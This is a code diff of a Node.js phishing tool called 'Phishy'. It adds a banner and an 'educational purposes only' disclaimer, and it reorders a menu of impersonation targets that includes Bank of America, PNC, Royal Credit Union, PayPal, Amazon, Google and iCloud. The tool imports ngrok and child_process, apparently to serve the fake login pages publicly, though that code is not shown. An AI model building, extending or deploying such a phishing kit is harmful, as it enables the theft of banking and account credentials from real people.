@@ -8,27 +8,46 @@ const ngrok = require('ngrok');
 const inquirer = require('inquirer');
 const { exec } = require('child_process');
 
+console.log(`
+
+    :: Disclaimer: Developers assume no liability and are not ::
+    :: responsible for any misuse or damage caused by Phishy. ::
+    :: Only use for educational purposes!                     ::
+
+                     .                  Twitter | https://www.twitter.com/ant_devs
+                    ":"                   
+                  ___:____     |"\/"|       
+                ,'        '.    \  /       
+                |  O        \___/  |
+                ~^~^~^~^~^~^~^~^~^~^~^~^~
+        ██████  ██   ██ ██ ███████ ██   ██ ██    ██ 
+        ██   ██ ██   ██ ██ ██      ██   ██  ██  ██  
+        ██████  ███████ ██ ███████ ███████   ████   
+        ██      ██   ██ ██      ██ ██   ██    ██    
+        ██      ██   ██ ██ ███████ ██   ██    ██                                            
+`);
+
 inquirer
 	.prompt([
 		{
 			type: 'list',
-			name: 'websiteOption',
+			name: 'website',
 			message: 'Please choose a website',
 			choices: [
+				'Bank of America',
+				'Royal Credit Union',
+				'PNC',
 				'Amazon',
-				'Bank Of America',
 				'Google',
 				'iCloud',
 				'Instagram',
 				'LinkedIn',
-				'PNC',
-				'Royal Credit Union',
 				'PayPal',
 			],
 		},
 	])
 	.then((answer) => {
-		const ans = answer['websiteOption'];
+		const ans = answer.website;
 
 		const website = ans.split(' ').join('').toLowerCase();
 
